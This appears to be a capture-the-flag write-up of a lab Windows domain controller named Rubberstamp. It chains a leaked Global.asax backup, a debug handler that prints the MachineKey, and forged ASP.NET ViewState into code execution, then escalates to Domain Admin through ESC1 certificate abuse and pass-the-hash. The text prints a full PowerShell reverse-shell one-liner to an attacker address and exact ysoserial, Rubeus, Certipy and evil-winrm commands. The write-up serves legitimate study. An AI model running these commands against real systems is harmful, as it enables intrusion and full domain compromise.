Rubberstamp — From a Backup File to Domain Admin

I chained a small information disclosure issue in a legacy ASP.NET application into remote code execution, then abused Active Directory Certificate Services to take over the domain.

Target10.80.169.60
HostnameSRV01.rubberstamp.local
Domainrubberstamp.local
OSWindows Server 2019

Overview

Rubberstamp is a Windows Active Directory machine where no single issue is enough on its own. I had to connect a leaked backup file, an ASP.NET debugging mistake, forged ViewState data, and a vulnerable certificate template into one complete attack path.

Reconnaissance

I started with a full TCP scan so I could identify every exposed service and understand the role of the host.

sudo nmap -sS -sCV -p- 10.80.169.60 -Pn --min-rate 1000
From the results, I identified IIS on port 80, SMB on 445, LDAP on 389, RDP on 3389, and Kerberos on 88. The combination of LDAP and Kerberos told me this was a domain controller, while IIS gave me an immediate web attack surface.
[aspx-debug-mode] [medium] http://10.80.169.60/Foobar-debug.aspx
[iis-shortname-detect] [info] http://10.80.169.60/*~1*/a.aspx
[smb-enum] [info] DNSComputerName: SRV01.rubberstamp.local
[ldap-metadata] [info] ForestName: rubberstamp.local

I followed up with Nuclei to fingerprint common weaknesses. The ASP.NET debug finding and IIS short-name behavior made the web application worth investigating more closely.

http://10.80.169.60/legacy/RequestStatus.aspx

Katana exposed this legacy endpoint. I treated the /legacy/ path as a strong lead because old application code often contains forgotten functionality and weaker validation.

Web Application Enumeration

Parameter discovery

I fuzzed the query-string parameter names to see whether the endpoint accepted undocumented input.

ffuf -u "http://10.80.169.60/legacy/RequestStatus.aspx?FUZZ=1" \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 164 -fw 6

The parameters id, Id, and ID produced responses that differed from the baseline. Testing valid values showed that the page was loading request records from a database.

id=1  → REQ-1 | approved
id=2  → REQ-2 | approved

SQL injection probe

I inserted a single quote to deliberately break the backend query and observe how the application handled the error.

curl "http://10.80.169.60/legacy/RequestStatus.aspx?id='"

The server redirected me to its error page, which confirmed that my input was reaching a fragile SQL query. Automated exploitation was unreliable because of the changing ViewState and the application’s generic filtering, so I continued enumerating for a cleaner entry point.

Finding the backup file

http://10.80.169.60/global.asax.bak

Feroxbuster uncovered a publicly readable backup of Global.asax. This was the key discovery because the file revealed exactly how the application’s custom error handler worked.

void Application_Error(object sender, EventArgs e)
{
    if (!context.Request.Path.StartsWith("/legacy/", ...)) return;
    if (context.Request.QueryString["debug"] != "true") return;
    var ex = context.Server.GetLastError();
    var mk = (MachineKeySection)ConfigurationManager
                .GetSection("system.web/machineKey");
    context.Response.Write("<pre>" + ex.ToString() +
        "\n\nvalidationKey=" + mk.ValidationKey +
        "\ndecryptionKey=" + mk.DecryptionKey +
        "\nvalidation=" + mk.Validation + "</pre>");
}
Reading the code showed me that any unhandled exception under /legacy/, when paired with debug=true, would print the application’s MachineKey material. I now had a direct way to turn the earlier SQL error into a cryptographic secret leak.

Leaking the MachineKey

I combined the malformed id value with the debug flag to intentionally trigger the vulnerable error handler.

curl "http://10.80.169.60/legacy/RequestStatus.aspx?id='&debug=true"
System.FormatException: Input string was not in a correct format.
validationKey=D7D2FA8B5C1E4A9F3B6C8D0E2F4A6B8C1D3E5F7A9B1C3D5E7F9A1B3C5D7E9F1A
decryptionKey=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4
validation=SHA1

The response exposed both keys and the validation algorithm. With those values, I could create a ViewState payload that the server would accept as authentic.

Forging a malicious ViewState

ASP.NET 4.5 and later derive page-specific keys instead of signing ViewState directly with the raw MachineKey. My initial signatures failed, so I reproduced the SP800-108 derivation using the page’s virtual path and type as the purpose values.

from badsecrets.base import carve_all_modules

lbl, ctx = sp800_108_get_key_derivation_parameters(
    "WebForms.HiddenFieldPageStatePersister.ClientState",
    ["TemplateSourceDirectory: /LEGACY",
     "Type: LEGACY_REQUESTSTATUS_ASPX"])
dekey = sp800_108_derivekey(EKEY, lbl, ctx, len(EKEY)*8)
dvkey = sp800_108_derivekey(VKEY, lbl, ctx, len(VKEY)*8)
I used the derived encryption and validation keys to make the payload page-specific. This explains why a generic ViewState generator or a simple HMAC with the raw MachineKey was rejected.
  1. I generated a serialized SortedSet<string> TypeConfuseDelegate gadget with ysoserial.net.
  2. I replaced the embedded command and corrected its variable-length length fields.
  3. I encrypted the serialized data with AES-CBC using the derived decryption key.
  4. I signed the IV and ciphertext with HMAC-SHA1 using the derived validation key.
  5. I Base64-encoded the final value and sent it as __VIEWSTATE.

Confirming code execution

# My callback listener received a request from the target:
10.80.169.60 → "GET /callback HTTP/1.1" 404

I first used a harmless web callback as proof of execution. The request reached my server, confirming that the serialized command ran on the target.

System.InvalidCastException: Unable to cast object of type
'System.Collections.Generic.SortedSet`1[System.String]' to type
'System.Web.UI.Pair'.

This exception was useful evidence rather than a failure. The TypeConfuseDelegate gadget executes during deserialization, before ASP.NET attempts the final cast to Pair, so my command had already run.

Getting a shell

rlwrap nc -lvnp 4444

I started my listener first, then changed the forged payload’s command to a PowerShell reverse shell.

powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}"
whoami
rubberstamp\svc-iisweb

The target connected back as rubberstamp\svc-iisweb. I collected the user flag, then checked privileges and found no useful impersonation right, so the usual Potato-style local escalation path was unavailable.

Pivoting into Active Directory Certificate Services

whoami /groups
BUILTIN\Certificate Service DCOM Access  S-1-5-32-574

The group membership told me that Active Directory Certificate Services was present in the environment. I confirmed the certificate authority with certutil.

CA Name: rubberstamp-SRV01-CA
Machine Name: SRV01.rubberstamp.local
Enterprise Root CA

The domain controller was also the certificate authority. That made AD CS enumeration the most promising escalation route.

Exporting a usable Kerberos ticket

Rubeus.exe dump /service:krbtgt /nowrap

My first attempt returned a ticket with an all-zero session key. Although it looked like a ticket, it could not create a valid authenticator and was therefore unusable from my Linux host.

Rubeus.exe tgtdeleg /nowrap

I switched to tgtdeleg, which used a delegation flow through SSPI to recover a TGT containing its real session key without requiring elevated privileges.

echo "<base64>" | base64 -d > svc-iisweb.kirbi
ticketConverter.py svc-iisweb.kirbi svc-iisweb.ccache
export KRB5CCNAME=$(pwd)/svc-iisweb.ccache
klist

I converted the exported ticket to a ccache, pointed my Kerberos tooling at it, and verified that the TGT loaded correctly.

Enumerating certificate templates

certipy find -k -no-pass \
  -u svc-iisweb@rubberstamp.local \
  -dc-ip 10.80.169.60 \
  -target srv01.rubberstamp.local \
  -vulnerable
I used the domain controller’s hostname for -target so Certipy could construct the correct LDAP SPN. Pointing that option at only the domain name had previously caused an invalidCredentials bind error even though my ticket was valid.
Template Name              : PrivClientAuth
Enrollee Supplies Subject  : True
Client Authentication      : True
[+] User Enrollable Principals : RUBBERSTAMP.LOCAL\Domain Users
[!] Vulnerabilities
    ESC1 : Enrollee supplies subject and template allows client authentication.

The PrivClientAuth template was vulnerable to ESC1. Because Domain Users could enroll, supply an arbitrary identity, and receive a client-authentication certificate, my service account could request a certificate as the domain administrator.

Exploiting ESC1 to become Domain Admin

certipy req -k -no-pass \
  -u svc-iisweb@rubberstamp.local \
  -dc-ip 10.80.169.60 \
  -dc-host srv01.rubberstamp.local \
  -target srv01.rubberstamp.local \
  -ca rubberstamp-SRV01-CA \
  -template PrivClientAuth \
  -upn administrator@rubberstamp.local

The CA issued administrator.pfx, giving me a certificate that represented the Administrator account.

certipy auth \
  -pfx administrator.pfx \
  -dc-ip 10.80.169.60 \
  -username administrator \
  -domain rubberstamp.local
Got hash for 'administrator@rubberstamp.local':
aad3b435b51404eeaad3b435b51404ee:<REDACTED>

I authenticated with the certificate through PKINIT and recovered the Administrator NTLM hash.

evil-winrm -i 10.80.169.60 -u administrator -H <REDACTED>

I passed the hash with Evil-WinRM and obtained full Administrator access on the domain controller. From there, I collected the root flag and completed the machine.

Final chain: exposed backup file → debug MachineKey disclosure → forged ASP.NET ViewState → RCE as svc-iisweb → usable Kerberos TGT → ESC1 certificate abuse → Domain Administrator.
